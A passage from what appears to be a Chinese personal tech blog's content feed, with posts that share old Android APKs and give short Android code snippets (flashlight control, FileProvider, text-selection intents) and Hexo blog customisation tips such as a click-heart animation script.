class="line"></span><br><span class="line">const WEB_SITE = <span class="string">'https://gddhy.net/2021/magisk-zi-ding-yi-geng-xin-tong-dao/'</span></span><br><span class="line">const JSON_STABLE = <span class="string">'https://raw.githubusercontent.com/topjohnwu/magisk-files/master/stable.json'</span></span><br><span class="line">const JSON_BETA = <span class="string">'https://raw.githubusercontent.com/topjohnwu/magisk-files/master/beta.json'</span></span><br><span class="line">const JSON_CANARY = <span class="string">'https://raw.githubusercontent.com/topjohnwu/magisk-files/master/canary.json'</span></span><br><span class="line">const statusCode = 301</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>安卓语言设置</title>
      <link href="/2021/an-zhuo-yu-yan-she-zhi/"/>
      <url>/2021/an-zhuo-yu-yan-she-zhi/</url>
      
        <content type="html"><![CDATA[<p>使用这个软件可以随意设置手机系统语言，里面支持的语言特别多，你如果知道语言代码，也可以自定义语言，这个软件对于MIUI这种阉割了语言设置的ROM很有帮助  </p><a id="more"></a>  <p>图标：<img src="/img/preloader.gif" data-original="icon.png" alt="icon"><br>软件名：语言设置<br>包名：set.lang.pro<br>大小：2.40M<br>版本：6.5.0<br>下载：<a href="https://res.gddhy.net/apk/LanguageSetting.apk" target="_blank" rel="noopener">直接下载</a> | <a href="https://m.shouji.com.cn/mip/down/1551079.html" target="_blank" rel="noopener">手机乐园下载</a>  </p><p>（此软件已被酷安下架，特地分享下）</p><p>软件需要root或adb的授权才能使用，附一条adb授权命令，软件内有帮助使用时会提示</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb shell pm grant set.lang.pro android.permission.CHANGE_CONFIGURATION</span><br></pre></td></tr></table></figure><p>大陆地区的手机将语言改其他地区的简体中文有惊喜，比如中国香港、新加坡，可以获得部分软件无广告的效果  </p><p>这个软件是看到 <a href="https://m.bilibili.com/video/BV1S54y1H7h2" target="_blank" rel="noopener">b站up主Finley凡的视频BV1S54y1H7h2</a> 时想起来的，去找这个软件时发现已被酷安下架，想了解效果的可以看一下这个视频</p><p>改语言并非所有软件都有效果，也有些弊端，软件不在当前语言地区提供服务的话会软件功能无法使用</p>]]></content>
      
      
      
        <tags>
            
            <tag> 软件分享 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>360健康卫士</title>
      <link href="/2021/360-jian-kang-wei-shi/"/>
      <url>/2021/360-jian-kang-wei-shi/</url>
      
        <content type="html"><![CDATA[<p>现在 屏幕使用时间/数字健康 已经是各家手机的标配了，几年前这个还是单独的手机买点，下面这个健康卫士预装在360与酷派合作的奇酷手机上  </p><a id="more"></a>  <p>图标：<img src="/img/preloader.gif" data-original="icon.png" alt="icon"><br>软件名：健康卫士<br>包名：com.qiku.healthguard<br>大小：2.54M<br>版本：0.4.16.16_VER_2016.11.22_17:45:20<br>下载：<a href="https://res.gddhy.net/apk/360healthguard.apk" target="_blank" rel="noopener">360健康卫士</a>  </p><p>软件功能：统计手机使用时长、软件使用次数还有健康提醒  </p><p>软件现在看起来没什么亮点（现在各家标配的功能），不过软件干净的不像360系的软件，软件已经解除应用安装限制，非奇酷手机/360手机都可以安装使用</p><p>安装时记得给自启动权限/使用情况访问权限，锁定后台</p><p>使用情况访问权限在 <code>系统设置</code> - <code>应用</code> - <code>特殊应用权限</code> - <code>使用情况访问权限</code> ，在MIUI上的位置 <code>系统设置</code> - <code>隐私保护</code> - <code>管理</code> - <code>特殊应用权限</code> - <code>使用情况访问权限</code>，找到 健康卫士 打开即可</p><p>小米魔改权限，若要使用提醒需额外的 <code>后台弹出界面</code> 权限</p>]]></content>
      
      
      
        <tags>
            
            <tag> 软件分享 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>安卓获取手电筒状态和开关手电筒</title>
      <link href="/2021/an-zhuo-shou-dian-tong-cao-zuo/"/>
      <url>/2021/an-zhuo-shou-dian-tong-cao-zuo/</url>
      
        <content type="html"><![CDATA[<p>这个是之前为努比亚Mini5G制作的小程序屏蔽相机按键的手电筒部分，整理文件时发现的源码还留着，记录一下，软件在<a href="https://www.coolapk.com/feed/19687837?shareKey=ZDYzNDVmODMxZTFjNjBkNWMxMjM~&shareUid=778415&shareFrom=com.coolapk.market_11.2.5" target="_blank" rel="noopener">酷安获取</a>  </p><a id="more"></a>  <h4 id="开关手电筒"><a href="#开关手电筒" class="headerlink" title="开关手电筒"></a>开关手电筒</h4><p>调用闪光灯硬件先申请权限  </p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">"android.permission.FLASHLIGHT"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">"android.permission.CAMERA"</span>/&gt;</span></span><br></pre></td></tr></table></figure><p>开关手电筒</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> CameraManager manager;</span><br><span class="line"><span class="keyword">private</span> Camera camera;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span></span>&#123;</span><br><span class="line">  <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">  ...</span><br><span class="line">  <span class="keyword">if</span>(manager == <span class="keyword">null</span>)&#123;</span><br><span class="line">    manager = (CameraManager) getSystemService(Context.CAMERA_SERVICE);</span><br><span class="line">  &#125;</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">openFlash</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (Build.VERSION.SDK_INT &gt;= Build.VERSION_CODES.M) &#123;</span><br><span class="line">      <span class="keyword">if</span> (manager != <span class="keyword">null</span>) &#123;</span><br><span class="line">        manager.setTorchMode(<span class="string">"0"</span>, <span class="keyword">true</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      camera = Camera.open();</span><br><span class="line">      Camera.Parameters parameters = camera.getParameters();</span><br><span class="line">      parameters.setFlashMode(Camera.Parameters.FLASH_MODE_TORCH);</span><br><span class="line">      camera.setParameters(parameters);</span><br><span class="line">      camera.startPreview();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">    e.printStackTrace();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">closeFlash</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (Build.VERSION.SDK_INT &gt;= Build.VERSION_CODES.M) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="keyword">if</span> (manager == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      manager.setTorchMode(<span class="string">"0"</span>, <span class="keyword">false</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">      e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (camera == <span class="keyword">null</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    camera.stopPreview();</span><br><span class="line">    camera.release();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>上面开关手电筒部分用到了 <a href="https://github.com/Mason-Xu/JustAFlashLight" target="_blank" rel="noopener">Mason-Xu/JustAFlashLight</a> 项目的源码</p></blockquote><h4 id="获取手电筒状态"><a href="#获取手电筒状态" class="headerlink" title="获取手电筒状态"></a>获取手电筒状态</h4><p>接上面代码，用下面这个可以在回调中获取手电筒状态</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">manager.registerTorchCallback(torchCallback, <span class="keyword">null</span>);</span><br></pre></td></tr></table></figure><p>获取到手电筒状态进行开启关闭操作</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> CameraManager.TorchCallback torchCallback = <span class="keyword">new</span> CameraManager.TorchCallback() &#123;</span><br><span class="line">  <span class="meta">@Override</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onTorchModeChanged</span><span class="params">( String cameraId, <span class="keyword">boolean</span> enabled)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">super</span>.onTorchModeChanged(cameraId, enabled);</span><br><span class="line">    manager.unregisterTorchCallback(torchCallback);</span><br><span class="line">    <span class="keyword">if</span>(!enabled)&#123;</span><br><span class="line">      <span class="comment">//手电筒状态关闭，执行开启</span></span><br><span class="line">      openFlash();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="comment">//手电筒状态开启，执行关闭</span></span><br><span class="line">      closeFlash();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onDestroy</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">super</span>.onDestroy();</span><br><span class="line">  <span class="keyword">if</span>(manager != <span class="keyword">null</span> &amp;&amp; torchCallback != <span class="keyword">null</span>)&#123;</span><br><span class="line">    manager.unregisterTorchCallback(torchCallback);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>获取到手电筒状态直接操作手电筒有时会闪烁直接关闭，经测试可以用下面代码解决</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">manager.unregisterTorchCallback(torchCallback);</span><br></pre></td></tr></table></figure><blockquote><p>获取手电筒状态，方法来自 <a href="https://www.jianshu.com/p/09e2ce731ed0" target="_blank" rel="noopener">android 9.0 获取手电筒状态以及打开/关闭手电筒</a></p></blockquote>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>两个VR程序-初音ミク-GUMI</title>
      <link href="/2021/liang-ge-vr-cheng-xu/"/>
      <url>/2021/liang-ge-vr-cheng-xu/</url>
      
        <content type="html"><![CDATA[<p>两个VR看MMD的软件，很早前暴风魔镜APP里下载安装的，这个并不需要多好的VR设备，纸盒VR也可以，只是VR观看MMD，并不需要交互  </p><a id="more"></a>  <p>能在国内暴风魔镜上架，这只是正常向的MMD，其他的不要多想  </p><p>图标：<img src="/img/preloader.gif" data-original="miku.png" alt="icon"><br>软件名：[dive]WAVEFILE_初音ミク fullver.<br>包名：com.mypaceengine.mmdtest<br>大小：49.10M<br>下载：<a href="https://pan.gddhy.net/VR/[dive]WAVEFILE_%E5%88%9D%E9%9F%B3%E3%83%9F%E3%82%AF%20fullver._com.mypaceengine.mmdtest.apk" target="_blank" rel="noopener">获取apk</a>  </p><p>图标：<img src="/img/preloader.gif" data-original="gumi.png" alt="icon"><br>软件名：[Cardboard]OtsukimiRecital_GUMI<br>包名：com.mypaceengine.mmdtest4<br>大小：39.78M<br>下载：<a href="https://pan.gddhy.net/VR/[Cardboard]OtsukimiRecital_GUMI_com.mypaceengine.mmdtest4.apk" target="_blank" rel="noopener">获取apk</a>  </p><p>网盘下载：<a href="https://pan.baidu.com/s/1swm9X3z5pOjqWekd87sh8Q" target="_blank" rel="noopener">https://pan.baidu.com/s/1swm9X3z5pOjqWekd87sh8Q</a> 提取码:011j<br>文件站：<a href="https://pan.gddhy.net/VR/" target="_blank" rel="noopener">https://pan.gddhy.net/VR</a>  </p><p>看软件包名是一个公司出的测试程序（mmdtest）？可能软件不止这两个，不过暴风魔镜只有上架这两个应用</p>]]></content>
      
      
      
        <tags>
            
            <tag> 软件分享 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>两个Miku桌面小部件</title>
      <link href="/2021/liang-ge-miku-zhuo-mian-xiao-bu-jian/"/>
      <url>/2021/liang-ge-miku-zhuo-mian-xiao-bu-jian/</url>
      
        <content type="html"><![CDATA[<p>这两个桌面小部件是很早前在酷安下载的，现在也已经下架了，放博客里分享下，分别是电量小部件和时间小部件  </p><a id="more"></a>  <p>图标：<img src="/img/preloader.gif" data-original="https://cdn.jsdelivr.net/gh/gddhy/blog-res@master/apk/miku_widget/mikulaboplut.png" alt="icon"><br>软件名：電池残量表示ウィジェットver.初音ミク<br>包名：batterywidget.mikuapp.mikulaboplut<br>大小：1.77M<br>下载：<a href="https://res.gddhy.net/apk/miku_widget/mikulaboplut.apk" target="_blank" rel="noopener">获取apk</a>  </p><p>图标：<img src="/img/preloader.gif" data-original="https://cdn.jsdelivr.net/gh/gddhy/blog-res/apk/miku_widget/mikulabo.png" alt="icon"><br>软件名：初音ミク時計ウィジェット.千本桜<br>包名：analogclockwidget.mikuapp.mikulabo<br>大小：1.77M<br>下载：<a href="https://res.gddhy.net/apk/miku_widget/mikulabo.apk" target="_blank" rel="noopener">获取apk</a>  </p><p>桌面小部件数据若想及时更新，需要保证软件后台运行，记得锁定后台和允许开机自启动</p><p>这个时钟插件在智器Z1手表上表现不错</p>]]></content>
      
      
      
        <tags>
            
            <tag> 软件分享 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>多个Provider配置</title>
      <link href="/2021/duo-ge-provider-pei-zhi/"/>
      <url>/2021/duo-ge-provider-pei-zhi/</url>
      
        <content type="html"><![CDATA[<p>程序中引用第三方带有FileProvider的SDK后，程序中再定义FileProvider会有冲突报错，可以改为使用自定义FileProvider解决  </p><a id="more"></a>  <p>程序中的FileProvider改为自定义FileProvider</p><p>在Manifest中引用，关于file_paths可以<a href="/2021/an-zhuo-tong-guo-uri-fen-xiang-wen-jian/">看这里</a></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">provider</span></span></span><br><span class="line"><span class="tag"> <span class="attr">android:name</span>=<span class="string">"net.gddhy.MyFileProvider"</span></span></span><br><span class="line"><span class="tag"> <span class="attr">android:authorities</span>=<span class="string">"$&#123;applicationId&#125;.FileProvider"</span></span></span><br><span class="line"><span class="tag"> <span class="attr">android:exported</span>=<span class="string">"false"</span></span></span><br><span class="line"><span class="tag"> <span class="attr">android:grantUriPermissions</span>=<span class="string">"true"</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">meta-data</span></span></span><br><span class="line"><span class="tag">  <span class="attr">android:name</span>=<span class="string">"android.support.FILE_PROVIDER_PATHS"</span></span></span><br><span class="line"><span class="tag">  <span class="attr">android:resource</span>=<span class="string">"@xml/file_paths"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">provider</span>&gt;</span></span><br></pre></td></tr></table></figure><p>自定义类继承FileProvider</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> net.gddhy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyFileProvider</span> <span class="keyword">extends</span> <span class="title">androidx</span>.<span class="title">core</span>.<span class="title">content</span>.<span class="title">FileProvider</span> </span>&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用时通过自定义的调用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Uri uri = MyFileProvider.getUriForFile(context, context.getPackageName()+<span class="string">".FileProvider"</span>, file);</span><br></pre></td></tr></table></figure><blockquote><p>方法来自<a href="https://www.jianshu.com/p/6f5b7b239a44" target="_blank" rel="noopener">解决多个provider配置问题 - GRock</a> 中的方案二</p></blockquote>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>老软件-单机斗地主</title>
      <link href="/2021/lao-ruan-jian-dan-ji-dou-di-zhu/"/>
      <url>/2021/lao-ruan-jian-dan-ji-dou-di-zhu/</url>
      
        <content type="html"><![CDATA[<p>分享一个老软件，单机斗地主，软件体积比现在软件商店里的斗地主游戏小很多，只有核心功能，没在线那些乱七八糟的功能  </p><a id="more"></a>  <p>图标：<img src="/img/preloader.gif" data-original="ic_launcher.png" alt="icon"><br>软件名：单机斗地主<br>包名：com.june.game.doudizhu<br>大小：3.16M<br>版本：2.2.5<br>下载：<a href="https://res.gddhy.net/apk/doudizhu.apk" target="_blank" rel="noopener">斗地主2.2.5</a>  </p><p>这个软件也是安卓2.x/4.x时候留下来的老版本，功能就同软件名称一样，单机版斗地主，可以局域网和朋友联机玩，在线功能没有</p><p>软件其实带了友盟的广告插件，不过版本久远，广告插件以及失效不能正常加载（软件里面只留了精品应用这个广告平台入口，不手动点击也不会触发，开发者算是很良心了，就算接了广告也不影响正常功能</p><p>想要玩纯粹的斗地主也可以试试这个，<a href="https://vmrp.gddhy.net/?f=https://cdn.jsdelivr.net/gh/gddhy/mrp-web/mrp-files/390012_240320_gtmddz.mrp&title=%E6%96%97%E5%9C%B0%E4%B8%BB" target="_blank" rel="noopener">斗地主Mrp版</a>，和单机斗地主apk一样，这个是十余年前功能机平台的游戏</p>]]></content>
      
      
      
        <tags>
            
            <tag> 软件分享 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>老软件-中华万年历</title>
      <link href="/2021/lao-ruan-jian-zhong-hua-wan-nian-li/"/>
      <url>/2021/lao-ruan-jian-zhong-hua-wan-nian-li/</url>
      
        <content type="html"><![CDATA[<p>最早用的山寨安卓机里有预装这个程序，用着不错就一直保留着了，从安卓2.x一直留到现在  </p><a id="more"></a>  <p>图标：<img src="/img/preloader.gif" data-original="icon.png" alt="icon"><br>软件名：中华万年历<br>包名：com.keenvim.cnCalendar<br>大小：406.43K<br>下载：<a href="https://res.gddhy.net/apk/cnCalendar.apk" target="_blank" rel="noopener">下载apk</a></p><p>说是分享，也是给自己留个存档吧，万一某一天卸掉了想找回来也方便</p><p>软件的一些工具/设置都需要菜单键打开，以前安卓还有四大金刚键无所谓，现在都是全面屏，打开菜单会麻烦点</p><p>软件工具带单里带的中国历史年代表不错</p>]]></content>
      
      
      
        <tags>
            
            <tag> 软件分享 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>自定义文本选择</title>
      <link href="/2021/zi-ding-yi-wen-ben-xuan-ze/"/>
      <url>/2021/zi-ding-yi-wen-ben-xuan-ze/</url>
      
        <content type="html"><![CDATA[<p>看到谷歌翻译可以把自己添加到文字选择的菜单里，可以快速使用使用翻译，开始只是以为这是谷歌给自己应用留的接口，上网了解过后才知道这个是Android M 引入的新功能  </p><a id="more"></a>  <p>直接贴代码  </p><p>在Manifest的Activity中添加intent-filter</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">action</span></span></span><br><span class="line"><span class="tag">  <span class="attr">android:name</span>=<span class="string">"android.intent.action.PROCESS_TEXT"</span> /&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">category</span></span></span><br><span class="line"><span class="tag">  <span class="attr">android:name</span>=<span class="string">"android.intent.category.DEFAULT"</span> /&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">data</span></span></span><br><span class="line"><span class="tag">  <span class="attr">android:mimeType</span>=<span class="string">"text/plain"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br></pre></td></tr></table></figure><p>在Activity的onCreate()使用下面代码即可获取到选中的文本</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CharSequence text = getIntent().getCharSequenceExtra(Intent.EXTRA_PROCESS_TEXT);</span><br></pre></td></tr></table></figure><p>相关资料 <a href="https://blog.csdn.net/chuyangchangxi/article/details/83715052" target="_blank" rel="noopener">Intent.ACTION_PROCESS_TEXT实现摘抄功能 - CSDN博客</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>博客美化&amp;拓展</title>
      <link href="/2021/bo-ke-mei-hua-tuo-zhan/"/>
      <url>/2021/bo-ke-mei-hua-tuo-zhan/</url>
      
        <content type="html"><![CDATA[<p>博客建好后，有很长一段时间放手什么都没管，后来绑定域名时又多做了些修改，最近看到些有意思的功能/插件一并添加了  </p><a id="more"></a>  <h5 id="美化：自定义鼠标样式"><a href="#美化：自定义鼠标样式" class="headerlink" title="美化：自定义鼠标样式"></a>美化：自定义鼠标样式</h5><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/** 鼠标样式 开始**/</span></span><br><span class="line"><span class="comment">/** 普通指针样式**/</span></span><br><span class="line"><span class="selector-tag">body</span> &#123;</span><br><span class="line"><span class="attribute">cursor</span>: <span class="built_in">url</span>(http://cuijiahua.com/xxx/cursor_1.png), default;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/** 链接指针样式**/</span></span><br><span class="line"><span class="selector-tag">a</span><span class="selector-pseudo">:hover</span>&#123;<span class="attribute">cursor</span>:<span class="built_in">url</span>(http://cuijiahua.com/xxx/cursor_2.png), pointer;&#125;</span><br><span class="line"><span class="comment">/** 鼠标样式 结束**/</span></span><br></pre></td></tr></table></figure><p>方法来自<a href="https://cuijiahua.com/blog/2018/01/website_9.html" target="_blank" rel="noopener">网站美化：鼠标样式自定义</a> ，图片可以前往来源获取</p><h5 id="添加点击爱心效果"><a href="#添加点击爱心效果" class="headerlink" title="添加点击爱心效果"></a>添加点击爱心效果</h5><p>添加  <code>yilia/source/js/clicklove.js</code> 文件</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!<span class="function"><span class="keyword">function</span>(<span class="params">e,t,a</span>)</span>&#123;<span class="function"><span class="keyword">function</span> <span class="title">n</span>(<span class="params"></span>)</span>&#123;c(<span class="string">".heart&#123;width: 10px;height: 10px;position: fixed;background: #f00;transform: rotate(45deg);-webkit-transform: rotate(45deg);-moz-transform: rotate(45deg);&#125;.heart:after,.heart:before&#123;content: '';width: inherit;height: inherit;background: inherit;border-radius: 50%;-webkit-border-radius: 50%;-moz-border-radius: 50%;position: fixed;&#125;.heart:after&#123;top: -5px;&#125;.heart:before&#123;left: -5px;&#125;"</span>),o(),r()&#125;<span class="function"><span class="keyword">function</span> <span class="title">r</span>(<span class="params"></span>)</span>&#123;<span class="keyword">for</span>(<span class="keyword">var</span> e=<span class="number">0</span>;e&lt;d.length;e++)d[e].alpha&lt;=<span class="number">0</span>?(t.body.removeChild(d[e].el),d.splice(e,<span class="number">1</span>)):(d[e].y--,d[e].scale+=<span class="number">.004</span>,d[e].alpha-=<span class="number">.013</span>,d[e].el.style.cssText=<span class="string">"left:"</span>+d[e].x+<span class="string">"px;top:"</span>+d[e].y+<span class="string">"px;opacity:"</span>+d[e].alpha+<span class="string">";transform:scale("</span>+d[e].scale+<span class="string">","</span>+d[e].scale+<span class="string">") rotate(45deg);background:"</span>+d[e].color+<span class="string">";z-index:99999"</span>);requestAnimationFrame(r)&#125;<span class="function"><span class="keyword">function</span> <span class="title">o</span>(<span class="params"></span>)</span>&#123;<span class="keyword">var</span> t=<span class="string">"function"</span>==<span class="keyword">typeof</span> e.onclick&amp;&amp;e.onclick;e.onclick=<span class="function"><span class="keyword">function</span>(<span class="params">e</span>)</span>&#123;t&amp;&amp;t(),i(e)&#125;&#125;<span class="function"><span class="keyword">function</span> <span class="title">i</span>(<span class="params">e</span>)</span>&#123;<span class="keyword">var</span> a=t.createElement(<span class="string">"div"</span>);a.className=<span class="string">"heart"</span>,d.push(&#123;<span class="attr">el</span>:a,<span class="attr">x</span>:e.clientX<span class="number">-5</span>,<span class="attr">y</span>:e.clientY<span class="number">-5</span>,<span class="attr">scale</span>:<span class="number">1</span>,<span class="attr">alpha</span>:<span class="number">1</span>,<span class="attr">color</span>:s()&#125;),t.body.appendChild(a)&#125;<span class="function"><span class="keyword">function</span> <span class="title">c</span>(<span class="params">e</span>)</span>&#123;<span class="keyword">var</span> a=t.createElement(<span class="string">"style"</span>);a.type=<span class="string">"text/css"</span>;<span class="keyword">try</span>&#123;a.appendChild(t.createTextNode(e))&#125;<span class="keyword">catch</span>(t)&#123;a.styleSheet.cssText=e&#125;t.getElementsByTagName(<span class="string">"head"</span>)[<span class="number">0</span>].appendChild(a)&#125;<span class="function"><span class="keyword">function</span> <span class="title">s</span>(<span class="params"></span>)</span>&#123;<span class="keyword">return</span><span class="string">"rgb("</span>+~~(<span class="number">255</span>*<span class="built_in">Math</span>.random())+<span class="string">","</span>+~~(<span class="number">255</span>*<span class="built_in">Math</span>.random())+<span class="string">","</span>+~~(<span class="number">255</span>*<span class="built_in">Math</span>.random())+<span class="string">")"</span>&#125;<span class="keyword">var</span> d=[];e.requestAnimationFrame=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="keyword">return</span> e.requestAnimationFrame||e.webkitRequestAnimationFrame||e.mozRequestAnimationFrame||e.oRequestAnimationFrame||e.msRequestAnimationFrame||<span class="function"><span class="keyword">function</span>(<span class="params">e</span>)</span>&#123;setTimeout(e,<span class="number">1e3</span>/<span class="number">60</span>)&#125;&#125;(),n()&#125;(<span class="built_in">window</span>,<span class="built_in">document</span>);</span><br></pre></td></tr></table></figure><p>在 <code>yilia/layout/layout.ejs</code> 的 <code>body</code> 内添加</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;% if ( theme.clicklove ) &#123; %&gt;</span><br><span class="line">&lt;script type=&quot;text/javascript&quot; src=&quot;/js/clicklove.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;% &#125; %&gt;</span><br></pre></td></tr></table></figure><p>在yilia主题的_config.yml中控制样式应用</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 页面点击小红心</span></span><br><span class="line"><span class="attr">clicklove:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure><p>来源<a href="https://asdfv1929.github.io/posts/2018/01/26/next-clicklove.html" target="_blank" rel="noopener">Hexo NexT主题添加点击爱心效果</a></p><h5 id="Hexo-添加-PWA"><a href="#Hexo-添加-PWA" class="headerlink" title="Hexo 添加 PWA"></a>Hexo 添加 PWA</h5><p>PWA（Progressive Web App，渐进式网页应用），添加起来稍微麻烦点，我这里就不写了，参考下面两篇博客添加，都写得很详细了  </p><p><a href="https://yafine-blog.cn/posts/d0e9.html" target="_blank" rel="noopener">Hexo 添加 PWA 支持 | 过客～励む</a>  </p><p><a href="https://segmentfault.com/a/1190000016286007" target="_blank" rel="noopener">hexo博客简单支持PWA - SegmentFault 思否</a></p><h5 